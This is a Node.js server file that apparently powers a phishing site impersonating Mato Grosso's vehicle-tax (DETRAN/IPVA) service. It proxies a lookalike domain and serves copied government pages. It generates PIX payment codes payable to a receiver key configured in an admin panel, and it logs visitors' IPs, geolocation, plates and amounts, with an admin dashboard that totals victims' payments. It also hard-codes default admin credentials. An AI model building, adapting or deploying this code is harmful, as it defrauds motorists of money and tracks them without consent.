require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const sqlite3 = require('sqlite3').verbose();
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'chave_padrao_nao_use_em_producao';
const ADMIN_USER = process.env.ADMIN_USER || 'dg';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'dg1898';

// Caches para evitar duplicatas
const clickCache = new Map(); // IP -> timestamp
const pixCopyCache = new Map(); // chave: `${ip}:${placa}` -> timestamp
const CLICK_COOLDOWN = 2000; // 2 segundos para cliques
const PIX_COOLDOWN = 5 * 60 * 1000; // 5 minutos para cópias de PIX

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Logs
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Tratamento global de erros
process.on('uncaughtException', (err) => {
  console.error('❌ Exceção não capturada:', err);
});
process.on('unhandledRejection', (reason) => {
  console.error('❌ Promise rejeitada não tratada:', reason);
});

// Rate limiter
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { erro: 'Muitas requisições, tente mais tarde.' }
});

// ---------- Função para remover acentos ----------
function removerAcentos(texto) {
  if (!texto) return '';
  return texto.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
}

// ---------- Banco de dados ----------
const dbPath = './database.sqlite';
console.log('📁 Banco de dados:', dbPath);
let db;
try {
  db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
      console.error('❌ Erro ao abrir banco SQLite, usando memória:', err.message);
      db = new sqlite3.Database(':memory:');
    } else {
      console.log('✅ Banco de dados SQLite aberto com sucesso (arquivo).');
    }
    inicializarBanco();
  });
} catch (e) {
  console.error('❌ Falha crítica no SQLite, usando memória:', e.message);
  db = new sqlite3.Database(':memory:');
  inicializarBanco();
}

function inicializarBanco() {
  db.serialize(() => {
    db.run(`DROP TABLE IF EXISTS configuracoes`);
    db.run(`DROP TABLE IF EXISTS pagamentos`);
    db.run(`DROP TABLE IF EXISTS cliques`);
    db.run(`DROP TABLE IF EXISTS pix_copiados`);

    db.run(`CREATE TABLE configuracoes (chave TEXT PRIMARY KEY, valor TEXT)`);
    db.run(`CREATE TABLE pagamentos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      placa TEXT,
      cidade TEXT,
      estado TEXT,
      dispositivo TEXT,
      valor REAL,
      ip TEXT,
      data_hora DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    db.run(`CREATE TABLE cliques (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      pagina TEXT,
      ip TEXT,
      user_agent TEXT,
      cidade_estado TEXT,
      dispositivo TEXT,
      data_hora DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    db.run(`CREATE TABLE pix_copiados (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      placa TEXT,
      valor REAL,
      data_hora DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    const configsPadrao = {
      pix_chave: 'chave_pix_padrao',
      pix_cidade: 'Cuiabá',
      pix_nome: 'Recebedor Padrão',
      pix_identificador: 'ID123'
    };

    Object.entries(configsPadrao).forEach(([chave, valor]) => {
      db.run("INSERT INTO configuracoes (chave, valor) VALUES (?, ?)", [chave, valor]);
    });

    console.log('✅ Banco de dados inicializado com sucesso.');
  });
}

// ---------- Configuração do axios ----------
const axiosInstance = axios.create({
  timeout: 10000,
  withCredentials: true,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
  }
});

async function obterSessao() {
  try {
    await axiosInstance.get('https://departamento-veiculosmt.com/fazenda/detran/licenciamento/', {
      headers: { 'Referer': 'https://departamento-veiculosmt.com/' }
    });
    console.log('✅ Sessão obtida com sucesso.');
    return true;
  } catch (error) {
    console.error('⚠️ Erro ao obter sessão (proxy pode não funcionar):', error.message);
    return false;
  }
}

// ---------- Função para obter IP real (ignorando proxies internos) ----------
function getClientIp(req) {
  // Prioridade: x-forwarded-for (usado por proxies como Render)
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    // Pega o primeiro IP da lista (cliente original)
    const ip = forwarded.split(',')[0].trim();
    // Ignora IPs de rede interna que podem vir do proxy
    if (!ip.startsWith('10.') && !ip.startsWith('172.16.') && !ip.startsWith('192.168.')) {
      console.log(`🌍 IP real do cliente (x-forwarded-for): ${ip}`);
      return ip;
    }
  }
  // Fallback para IP direto (pode ser IP do proxy)
  const directIp = req.ip || req.connection.remoteAddress;
  console.log(`🌍 IP direto (possivelmente proxy): ${directIp}`);
  return directIp;
}

// ---------- Utilitários ----------
function obterDispositivo(userAgent) {
  if (/mobile/i.test(userAgent)) return 'Mobile';
  if (/tablet/i.test(userAgent)) return 'Tablet';
  return 'Desktop';
}

// ---------- Função de geolocalização com múltiplos fallbacks ----------
async function obterDadosGeolocalizacao(ip) {
  // Se for IP de localhost (teste), retorna um valor fixo para não quebrar testes locais
  if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.')) {
    console.log(`🧪 IP local detectado: ${ip}, usando fallback para teste`);
    return { cidade: 'Localhost', estado: 'Teste' };
  }

  console.log(`🔍 Iniciando geolocalização para IP: ${ip}`);

  // Lista de APIs em ordem de prioridade
  const apis = [
    {
      name: 'ipapi.co',
      url: `https://ipapi.co/${ip}/json/`,
      parse: (data) => ({
        cidade: data.city || 'Desconhecida',
        estado: data.region_code || 'Desconhecido'
      })
    },
    {
      name: 'ip-api.com',
      url: `http://ip-api.com/json/${ip}`,
      parse: (data) => data.status === 'success' ? {
        cidade: data.city || 'Desconhecida',
        estado: data.region || 'Desconhecido'
      } : null
    },
    {
      name: 'geoplugin',
      url: `http://www.geoplugin.net/json.gp?ip=${ip}`,
      parse: (data) => data.geoplugin_status === 200 ? {
        cidade: data.geoplugin_city || 'Desconhecida',
        estado: data.geoplugin_regionCode || 'Desconhecido'
      } : null
    }
  ];

  for (const api of apis) {
    try {
      console.log(`📡 Tentando ${api.name}...`);
      const response = await axios.get(api.url, { timeout: 3000 });
      const data = response.data;
      const resultado = api.parse(data);
      if (resultado && resultado.cidade !== 'Desconhecida') {
        console.log(`✅ Sucesso com ${api.name}: ${resultado.cidade}/${resultado.estado}`);
        return resultado;
      } else {
        console.log(`⚠️ ${api.name} retornou dados incompletos`);
      }
    } catch (e) {
      console.log(`❌ ${api.name} falhou: ${e.message}`);
    }
  }

  console.log(`❌ Todas as APIs falharam para IP ${ip}, retornando Desconhecida`);
  return { cidade: 'Desconhecida', estado: 'Desconhecido' };
}

// Registrar clique APENAS na home (cooldown curto)
async function registrarClique(req) {
  const ip = getClientIp(req);
  const now = Date.now();
  const lastClick = clickCache.get(ip);
  if (lastClick && (now - lastClick) < CLICK_COOLDOWN) {
    console.log(`⏱️ Clique ignorado (cooldown) para IP ${ip}`);
    return;
  }
  clickCache.set(ip, now);

  const userAgent = req.headers['user-agent'] || 'Desconhecido';
  const dispositivo = obterDispositivo(userAgent);
  const cidadeEstadoPadrao = 'Carregando...'; // valor temporário

  db.run(`INSERT INTO cliques (pagina, ip, user_agent, cidade_estado, dispositivo) VALUES (?, ?, ?, ?, ?)`,
    ['home', ip, userAgent, cidadeEstadoPadrao, dispositivo], function(err) {
      if (err) {
        console.error('❌ Erro ao registrar clique:', err.message);
      } else {
        const cliqueId = this.lastID;
        console.log(`✅ Clique registrado (ID ${cliqueId}): home - IP ${ip}`);

        // Atualiza a localização em background
        (async () => {
          const geo = await obterDadosGeolocalizacao(ip);
          const cidadeEstadoReal = `${geo.cidade} - ${geo.estado}`;
          db.run(`UPDATE cliques SET cidade_estado = ? WHERE id = ?`, [cidadeEstadoReal, cliqueId], (err2) => {
            if (err2) console.error('Erro ao atualizar geolocalização:', err2.message);
            else console.log(`📍 Geolocalização atualizada: ${cidadeEstadoReal}`);
          });
        })();
      }
    });
}

async function registrarPagamento(placa, valor, req) {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Desconhecido';
  const dispositivo = obterDispositivo(userAgent);
  const cidadePadrao = 'Carregando...';
  const estadoPadrao = '';

  db.run(`INSERT INTO pagamentos (placa, cidade, estado, dispositivo, valor, ip) VALUES (?, ?, ?, ?, ?, ?)`,
    [placa, cidadePadrao, estadoPadrao, dispositivo, valor, ip], function(err) {
      if (err) {
        console.error('❌ Erro ao registrar pagamento:', err.message);
      } else {
        const pagamentoId = this.lastID;
        console.log(`✅ Pagamento registrado (ID ${pagamentoId}): ${placa} - R$ ${valor}`);

        (async () => {
          const geo = await obterDadosGeolocalizacao(ip);
          db.run(`UPDATE pagamentos SET cidade = ?, estado = ? WHERE id = ?`,
            [geo.cidade, geo.estado, pagamentoId], (err2) => {
              if (err2) console.error('Erro ao atualizar geolocalização do pagamento:', err2.message);
              else console.log(`📍 Geolocalização atualizada para pagamento ${pagamentoId}: ${geo.cidade}/${geo.estado}`);
            });
        })();
      }
    });
}

function registrarPixCopiado(placa, valor, req) {
  const ip = getClientIp(req);
  const cacheKey = `${ip}:${placa}`;
  const now = Date.now();
  const lastCopy = pixCopyCache.get(cacheKey);
  if (lastCopy && (now - lastCopy) < PIX_COOLDOWN) {
    console.log(`⏱️ Cópia PIX ignorada (cooldown) para IP ${ip} e placa ${placa}`);
    return;
  }
  pixCopyCache.set(cacheKey, now);

  console.log(`📋 Registrando PIX copiado: placa=${placa}, valor=${valor} (tipo: ${typeof valor})`);
  const valorNumerico = Number(valor);
  if (isNaN(valorNumerico)) {
    console.error('❌ Valor inválido para PIX copiado:', valor);
    return;
  }
  db.run(`INSERT INTO pix_copiados (placa, valor) VALUES (?, ?)`, [placa, valorNumerico], function(err) {
    if (err) {
      console.error('❌ Erro ao registrar cópia do PIX:', err);
    } else {
      console.log('✅ PIX copiado registrado com sucesso, ID:', this.lastID);
    }
  });
}

// ---------- Funções para gerar payload PIX (com remoção de acentos) ----------
function calcularCRC16(str) {
  let crc = 0xFFFF;
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) {
        crc = (crc << 1) ^ 0x1021;
      } else {
        crc <<= 1;
      }
    }
  }
  crc &= 0xFFFF;
  return crc.toString(16).toUpperCase().padStart(4, '0');
}

function gerarPayloadPix(chave, nome, cidade, valor, identificador = '***') {
  const chaveLimpa = chave || 'chave_pix_padrao';
  const nomeLimpo = removerAcentos(nome) || 'Recebedor';
  const cidadeLimpa = removerAcentos(cidade) || 'Cidade';
  const idLimpo = removerAcentos(identificador) || '***';

  let payload = '000201';
  const gui = '0014br.gov.bcb.pix01' + chaveLimpa.length.toString().padStart(2, '0') + chaveLimpa;
  payload += '26' + gui.length.toString().padStart(2, '0') + gui;
  payload += '52040000';
  payload += '5303986';
  const valorStr = valor.toFixed(2);
  payload += '54' + valorStr.length.toString().padStart(2, '0') + valorStr;
  payload += '5802BR';
  const nomeTruncado = nomeLimpo.substring(0, 25);
  payload += '59' + nomeTruncado.length.toString().padStart(2, '0') + nomeTruncado;
  const cidadeTruncada = cidadeLimpa.substring(0, 15);
  payload += '60' + cidadeTruncada.length.toString().padStart(2, '0') + cidadeTruncada;
  payload += '62' + (idLimpo.length + 4).toString().padStart(2, '0') + '05' + idLimpo.length.toString().padStart(2, '0') + idLimpo;
  payload += '6304';
  const crc = calcularCRC16(payload);
  return payload + crc;
}

// ---------- Autenticação JWT ----------
function gerarToken() {
  return jwt.sign({ role: 'admin' }, JWT_SECRET, { expiresIn: '1d' });
}

function verificarToken(req, res, next) {
  const token = req.headers['authorization'];
  if (!token) return res.status(401).json({ erro: 'Token não fornecido' });
  jwt.verify(token, JWT_SECRET, (err, decoded) => {
    if (err) return res.status(401).json({ erro: 'Token inválido' });
    req.usuario = decoded;
    next();
  });
}

// ---------- Rotas do painel ----------
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.post('/api/login', (req, res) => {
  const { usuario, senha } = req.body;
  if (usuario === ADMIN_USER && senha === ADMIN_PASSWORD) {
    res.json({ token: gerarToken() });
  } else {
    res.status(401).json({ erro: 'Usuário ou senha incorretos' });
  }
});

app.get('/api/configuracao/pix', verificarToken, (req, res) => {
  const chaves = ['pix_chave', 'pix_cidade', 'pix_nome', 'pix_identificador'];
  const resultado = {};
  let pendentes = chaves.length;

  chaves.forEach(chave => {
    db.get("SELECT valor FROM configuracoes WHERE chave = ?", [chave], (err, row) => {
      if (err) {
        console.error(err);
        resultado[chave] = '';
      } else {
        resultado[chave] = row ? row.valor : '';
      }
      pendentes--;
      if (pendentes === 0) {
        res.json({
          chave: resultado.pix_chave || 'chave_pix_padrao',
          cidade: resultado.pix_cidade || 'Cuiabá',
          nome: resultado.pix_nome || 'Recebedor Padrão',
          identificador: resultado.pix_identificador || 'ID123'
        });
      }
    });
  });
});

app.post('/api/configuracao/pix', verificarToken, async (req, res) => {
  const { chave, cidade, nome, identificador } = req.body;
  if (!chave || !cidade || !nome || !identificador) {
    return res.status(400).json({ erro: 'Todos os campos são obrigatórios' });
  }

  const updates = [
    { chave: 'pix_chave', valor: chave },
    { chave: 'pix_cidade', valor: cidade },
    { chave: 'pix_nome', valor: nome },
    { chave: 'pix_identificador', valor: identificador }
  ];

  try {
    await Promise.all(updates.map(item => {
      return new Promise((resolve, reject) => {
        db.run("UPDATE configuracoes SET valor = ? WHERE chave = ?", [item.valor, item.chave], function(err) {
          if (err) reject(err);
          else resolve();
        });
      });
    }));
    res.json({ sucesso: true });
  } catch (err) {
    console.error('Erro ao salvar configurações:', err);
    res.status(500).json({ erro: 'Erro ao salvar configurações' });
  }
});

app.get('/api/pagamentos', verificarToken, (req, res) => {
  db.all(`SELECT placa, cidade, estado, dispositivo, valor, ip,
          strftime('%d/%m/%Y %H:%M', data_hora) as data_hora
          FROM pagamentos ORDER BY data_hora DESC LIMIT 15`, (err, rows) => {
    if (err) {
      console.error('Erro em /api/pagamentos:', err);
      return res.status(500).json({ erro: 'Erro ao buscar pagamentos' });
    }
    res.json(rows);
  });
});

app.get('/api/estatisticas', verificarToken, (req, res) => {
  const query = (sql) => {
    return new Promise((resolve, reject) => {
      db.get(sql, (err, result) => {
        if (err) reject(err);
        else resolve(result);
      });
    });
  };

  Promise.all([
    query("SELECT COUNT(*) as total_pagamentos FROM pagamentos"),
    query("SELECT SUM(valor) as total_valor FROM pagamentos"),
    query("SELECT COUNT(*) as total_cliques FROM cliques"),
    query("SELECT COUNT(*) as total_pix_copiados FROM pix_copiados"),
    query("SELECT SUM(valor) as total_valor_pix_copiados FROM pix_copiados"),
    query("SELECT COUNT(*) as pagamentos_hoje FROM pagamentos WHERE date(data_hora) = date('now')")
  ])
  .then(([pagCount, pagSum, cliques, pixCount, pixSum, hoje]) => {
    res.json({
      total_pagamentos: pagCount?.total_pagamentos || 0,
      total_valor_pagamentos: pagSum?.total_valor || 0,
      total_cliques: cliques?.total_cliques || 0,
      total_pix_copiados: pixCount?.total_pix_copiados || 0,
      total_valor_pix_copiados: pixSum?.total_valor_pix_copiados || 0,
      pagamentos_hoje: hoje?.pagamentos_hoje || 0
    });
  })
  .catch(err => {
    console.error('Erro nas estatísticas:', err);
    res.status(500).json({ erro: 'Erro ao buscar estatísticas' });
  });
});

app.post('/api/limpar-dados', verificarToken, (req, res) => {
  db.serialize(() => {
    db.run("DELETE FROM pagamentos");
    db.run("DELETE FROM cliques");
    db.run("DELETE FROM pix_copiados");
    db.run("DELETE FROM sqlite_sequence WHERE name='pagamentos'");
    db.run("DELETE FROM sqlite_sequence WHERE name='cliques'");
    db.run("DELETE FROM sqlite_sequence WHERE name='pix_copiados'");
  });
  res.json({ sucesso: true, mensagem: 'Todos os dados foram limpos.' });
});

app.post('/api/registrar-pagamento', limiter, (req, res) => {
  const { placa, valor } = req.body;
  if (!placa || !valor) return res.status(400).json({ erro: 'Dados incompletos' });
  registrarPagamento(placa, valor, req);
  res.json({ sucesso: true });
});

// ---------- Proxy para consulta IPVA (sem clique) ----------
app.post('/detran/ipva/consulta/', async (req, res) => {
  try {
    const { renavam, doc, infoDigitado, licenciamento } = req.body;
    const payload = new URLSearchParams({ renavam, doc, infoDigitado, licenciamento });

    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://departamento-veiculosmt.com',
      'Referer': 'https://departamento-veiculosmt.com/fazenda/detran/licenciamento/',
      'X-Requested-With': 'XMLHttpRequest'
    };

    const response = await axiosInstance.post(
      'https://departamento-veiculosmt.com/detran/ipva/consulta/',
      payload.toString(),
      { headers }
    );
    res.status(response.status).json(response.data);
  } catch (error) {
    console.error('Erro no proxy IPVA:', error.message);
    if (error.response) {
      res.status(error.response.status).json(error.response.data);
    } else {
      res.status(500).json({ erro: 'Erro interno no servidor proxy', detalhe: error.message });
    }
  }
});

// ---------- Rota dinâmica para página de débitos (sem clique) ----------
app.get('/detran/consulta/debitos/:renavam', async (req, res) => {
  const { renavam } = req.params;

  try {
    const response = await axiosInstance.get(
      `https://departamento-veiculosmt.com/detran/consulta/debitos/${renavam}`,
      { headers: { 'Referer': 'https://departamento-veiculosmt.com/fazenda/detran/licenciamento/' } }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Erro ao buscar página de débitos:', error.message);
    if (error.response) {
      res.status(error.response.status).send(error.response.data);
    } else {
      res.status(500).send('Erro interno ao carregar débitos: ' + error.message);
    }
  }
});

// ---------- Rotas PIX ----------
app.post('/detran/debitos/pix/emissao/', async (req, res) => {
  const { placa, valor } = req.body;
  let valorNumerico = 0;
  if (typeof valor === 'string') {
    const valorLimpo = valor.replace(/[^\d,.-]/g, '').replace(',', '.');
    valorNumerico = parseFloat(valorLimpo) || 0;
  } else if (typeof valor === 'number') {
    valorNumerico = valor;
  }
  console.log(`💰 Emissão PIX: placa=${placa}, valorOriginal=${valor}, convertido=${valorNumerico}`);
  registrarPagamento(placa, valorNumerico, req);

  const chaves = ['pix_chave', 'pix_cidade', 'pix_nome', 'pix_identificador'];
  const configs = {};
  let pendentes = chaves.length;

  chaves.forEach(chave => {
    db.get("SELECT valor FROM configuracoes WHERE chave = ?", [chave], (err, row) => {
      configs[chave] = row ? row.valor : '';
      pendentes--;
      if (pendentes === 0) {
        const chavePix = configs.pix_chave || 'chave_pix_padrao';
        const nome = configs.pix_nome || 'Recebedor Padrão';
        const cidade = configs.pix_cidade || 'Cuiabá';
        const identificador = configs.pix_identificador || 'ID123';

        const copiaCola = gerarPayloadPix(chavePix, nome, cidade, valorNumerico, identificador);
        const qrcode = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copiaCola)}`;

        console.log(`✅ PIX gerado para placa ${placa} com valor ${valorNumerico}`);

        res.json({
          status: 'ok',
          qrcode: qrcode,
          copiacola: copiaCola,
          hash: 'hash_' + Date.now()
        });
      }
    });
  });
});

app.post('/detran/debitos/pix/emitir/', (req, res) => {
  const { placa, acao, valor } = req.body;
  console.log('📨 POST /detran/debitos/pix/emitir/ body:', req.body);

  if (acao === 'copiouPix') {
    registrarPixCopiado(placa, valor, req);
  }
  res.json({ sucesso: true });
});

app.get('/detran/debitos/pix/status/:placa/:hash', (req, res) => {
  res.json({ status: 'aguardando' });
});

// ---------- Rota para imagens (inteligente) ----------
app.get('/assets/:file', (req, res) => {
  const file = req.params.file;
  const possiblePaths = [
    path.join(__dirname, 'assets', file),
    path.join(__dirname, file),
    path.join(__dirname, 'Fazenda IPVA MT 2026_files', file),
    path.join(__dirname, 'Débitos do Veículo_files', file)
  ];
  for (const p of possiblePaths) {
    if (fs.existsSync(p)) {
      console.log(`✅ Servindo ${file} de ${p}`);
      return res.sendFile(p);
    }
  }
  console.error(`❌ Arquivo ${file} não encontrado.`);
  res.status(404).send('Imagem não encontrada');
});

// Rota específica para renavam.png
app.get('/assets/renavam.png', (req, res) => {
  const possiblePaths = [
    path.join(__dirname, 'Fazenda IPVA MT 2026_files', 'renavam.png'),
    path.join(__dirname, 'assets', 'renavam.png'),
    path.join(__dirname, 'renavam.png')
  ];
  for (const p of possiblePaths) {
    if (fs.existsSync(p)) return res.sendFile(p);
  }
  res.status(404).send('Imagem renavam.png não encontrada');
});

// ---------- Rota raiz ----------
app.get('/', async (req, res) => {
  obterSessao().catch(() => {});
  registrarClique(req); // Único lugar onde cliques são contados

  const possibleFiles = ['Fazenda IPVA MT 2026.html', 'index.html'];
  for (const file of possibleFiles) {
    const fullPath = path.join(__dirname, file);
    if (fs.existsSync(fullPath)) {
      console.log(`✅ Servindo página inicial: ${file}`);
      return res.sendFile(fullPath);
    }
  }
  const htmls = fs.readdirSync(__dirname).filter(f => f.endsWith('.html'));
  let lista = '<h2>Arquivos disponíveis</h2><ul>';
  htmls.forEach(f => lista += `<li><a href="/${f}">${f}</a></li>`);
  lista += '</ul>';
  res.send(lista);
});

app.listen(PORT, () => {
  console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`📁 Pasta de trabalho: ${__dirname}`);
  const htmls = fs.readdirSync(__dirname).filter(f => f.endsWith('.html'));
  console.log('📄 Arquivos HTML encontrados:', htmls);
});
